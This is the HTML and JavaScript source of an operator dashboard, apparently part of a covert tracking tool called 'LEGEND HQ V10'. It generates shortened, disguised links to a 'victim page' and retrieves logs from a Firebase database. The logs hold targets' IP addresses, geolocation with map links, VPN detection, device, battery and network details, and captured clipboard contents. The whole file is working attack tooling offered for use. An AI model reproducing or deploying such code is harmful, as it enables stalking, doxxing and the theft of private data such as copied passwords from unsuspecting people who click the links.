<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MA LEGEND | CYBER COMMAND V10</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Poppins:wght@400;500&display=swap');
        body { background: #0a0a0a; font-family: 'Poppins', sans-serif; color: #00ffaa; padding: 20px; }
        .container { max-width: 900px; margin: auto; }
        .card { background: #151515; border: 1px solid #00ffaa33; border-radius: 15px; padding: 25px; box-shadow: 0 0 20px rgba(0,255,170,0.1); margin-bottom: 20px; }
        h2 { font-family: 'Orbitron'; text-align: center; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; background: #000; border: 1px solid #00ffaa66; border-radius: 8px; color: #fff; margin: 10px 0; outline: none; box-sizing: border-box; }
        .btn { width: 100%; padding: 15px; background: #00ffaa; color: #000; border: none; border-radius: 8px; font-family: 'Orbitron'; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        .btn:hover { background: #00cc88; box-shadow: 0 0 15px #00ffaa; }
        .log-card { background: #111; border-left: 4px solid #00ffaa; padding: 15px; margin-top: 15px; border-radius: 8px; font-size: 0.85rem; line-height: 1.6; }
        .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-top: 10px; }
        .badge { background: #1a1a1a; border: 1px solid #333; padding: 4px 8px; border-radius: 4px; display: inline-block; margin: 2px; }
        .vpn-alert { color: #ff4444; font-weight: bold; border: 1px solid #ff4444; padding: 2px 5px; border-radius: 4px; }
        pre { background: #000; padding: 10px; border-radius: 5px; border: 1px solid #333; color: #00ffaa; overflow-x: auto; }
        .copy-sec { display: none; gap: 10px; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h2>LEGEND HQ V10</h2>
            <input type="text" id="masterKey" placeholder="Secret Key (e.g. Legend786)">
            <input type="text" id="targetUrl" placeholder="Redirect Link (e.g. https://youtube.com)">
            <button class="btn" onclick="generateLink()">GENERATE ENCRYPTED LINK</button>
            <div id="copySec" class="copy-sec">
                <input type="text" id="finalLink" readonly>
                <button class="btn" style="width:100px; margin:0;" onclick="copyLink()">COPY</button>
            </div>
        </div>

        <div class="grid-3">
            <button class="btn" onclick="fetchLogs('tracking')">DETAILED LOGS</button>
            <button class="btn" onclick="fetchLogs('clipboard')">CLIPBOARD DATA</button>
        </div>
        <div id="displayArea"></div>
    </div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
        const VICTIM_PAGE = "https://video-obtg.vercel.app/";

        async function generateLink() {
            const key = document.getElementById('masterKey').value.trim();
            const url = document.getElementById('targetUrl').value.trim();
            if(!key || !url) return alert("All fields are required!");
            const payload = btoa(JSON.stringify({ k: key, r: url }));
            const longLink = `${VICTIM_PAGE}?id=${payload}`;
            try {
                const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longLink)}`);
                document.getElementById('finalLink').value = await res.text();
            } catch(e) { document.getElementById('finalLink').value = longLink; }
            document.getElementById('copySec').style.display = 'flex';
        }

        function copyLink() {
            const el = document.getElementById("finalLink"); el.select(); document.execCommand("copy"); alert("Copied to clipboard!");
        }

        async function fetchLogs(path) {
            const key = document.getElementById('masterKey').value.trim();
            const res = await fetch(`${DB_URL}${path}/${key}.json`);
            const data = await res.json();
            const area = document.getElementById('displayArea');
            area.innerHTML = `<h3>${path.toUpperCase()} RESULTS</h3>`;
            if(!data) return area.innerHTML += "<p>No data found.</p>";
            
            Object.keys(data).reverse().forEach(id => {
                const item = data[id];
                if(path === 'tracking') {
                    area.innerHTML += `
                    <div class="log-card">
                        <div class="badge">üïí ${item.time}</div>
                        <div class="badge">üì± ${item.device}</div><br>
                        <div class="badge">üåê IP: ${item.ip}</div>
                        ${item.isProxy ? '<span class="vpn-alert">‚ö†Ô∏è VPN/PROXY DETECTED</span>' : '<span style="color:cyan">[Asli IP]</span>'}<br>
                        <div class="badge">üìç ${item.loc}</div>
                        <div class="badge">üïí Local Time: ${item.localTime}</div><br>
                        <div class="badge">üîã Battery: ${item.battery}% (${item.charging})</div>
                        <div class="badge">üß† RAM: ${item.ram}GB</div>
                        <div class="badge">üì∂ Net: ${item.netType} (${item.speed} Mbps)</div><br>
                        <div class="badge">üñ•Ô∏è Res: ${item.res}</div>
                        <div class="badge">üìê Mode: ${item.orient}</div><br>
                        <a href="${item.map}" target="_blank" style="color:#00ffaa; font-weight:bold;">[ VIEW ON GOOGLE MAPS ]</a>
                    </div>`;
                } else {
                    area.innerHTML += `<div class="log-card"><div class="badge">üïí ${item.time}</div><pre>${item.clipData}</pre></div>`;
                }
            });
        }
    </script>
</body>
</html>
